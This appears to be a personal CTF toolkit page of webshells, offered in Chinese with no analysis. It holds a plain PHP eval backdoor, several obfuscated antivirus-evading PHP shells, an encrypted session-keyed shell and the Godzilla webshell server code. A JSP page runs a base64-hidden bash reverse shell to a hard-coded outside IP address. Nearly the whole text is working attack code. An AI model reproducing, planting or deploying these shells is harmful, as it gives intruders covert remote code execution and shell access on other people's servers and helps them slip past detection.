## 文章

[分享一些比较强悍的PHP木马大全-源码-腾讯云开发者社区-腾讯云](F:\LocalCTF\分享一些比较强悍的PHP木马大全-源码-腾讯云开发者社区-腾讯云.html)

[]()

[免杀Webshell](F:\ctfTools\AvoidkillingPHP\webshell)

## PHP

普通马

```php
<?php eval($_POST["Ki1ro"]);?>
```

一些免杀马

```php
<?php $b=${\"i<=<}\"^\"6lro)\"}["Ki1ro"];$t=\"+?[?$<\"^\"XF(KAQ\";${\'t\'}($b);?>
```

```php
<?php $arr = [$_POST["Ki1ro"],$_REQUEST["Ki1ro"]];@assert($arr[mt_rand(0,1)]);?>
```

```php
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else if(!empty($_SESSION['k']))
{
    $key=$_SESSION['k'];
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");

        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15];
                }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __construct($p) {eval($p."");}}
    @new C($params);
}
?>
```

**哥斯拉** Webshell

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```



## JSP

```
<%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTIuMTM2LjE2NS42OC82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
%>
```

